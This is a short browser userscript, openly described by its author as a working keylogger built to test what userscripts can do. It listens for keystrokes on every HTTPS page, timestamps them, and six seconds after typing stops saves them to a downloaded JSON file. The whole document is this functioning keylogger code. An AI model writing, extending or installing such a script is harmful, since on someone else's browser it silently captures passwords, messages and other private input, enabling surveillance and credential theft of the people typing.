// ==UserScript==

// BEWARE - this actually saves your keypresses on a webpage to a file like a legitimate keylogger - nothing is hidden or obfuscated, but I wanted to see if it was possible using the boundaries of userscripts and the developer console. 


// @name         Keylog3
// @namespace    https://localhost
// @version      0.2
// @description  Logs keystrokes to a file 6 seconds after the last keypress. 
// @author       matts0613
// @match        https://*/*
// @match        localhost
// @grant        GM_xmlhttpRequest
// ==/UserScript==

// define main function
(function () {
    'use strict';

    let log = [];
    let typingTimer;
    let doneTypingInterval = 6000; // 6 seconds

    // add eventListener for keydown 
    document.addEventListener('keydown', function (event) {
        // Add keystrokes to the log
        log.push({
            key: event.key,
            timestamp: Date.now()
        });

        // Reset the timer on each keypress - saves the keylog file after no keypresses have been entered for 6 seconds after the last keypress logged
        clearTimeout(typingTimer);
        typingTimer = setTimeout(function () {
            console.log("User has stopped typing for 6 seconds - saving log-key.json file.");
            // added alert in case that is preferable to console logging
            // alert("User has stopped typing for 6 seconds - saving log-key.json file."); 

            // Save the log to a file
            if (log.length > 0) {
                const blob = new Blob([JSON.stringify(log)], {
                    type: 'application/json'
                });
                const url = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = url;
                link.download = 'log-key.json'; //saves keypresses to log-key.json
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                URL.revokeObjectURL(url);
                log = []; // Clear the log after saving
            }

        }, doneTypingInterval);
    });

})();
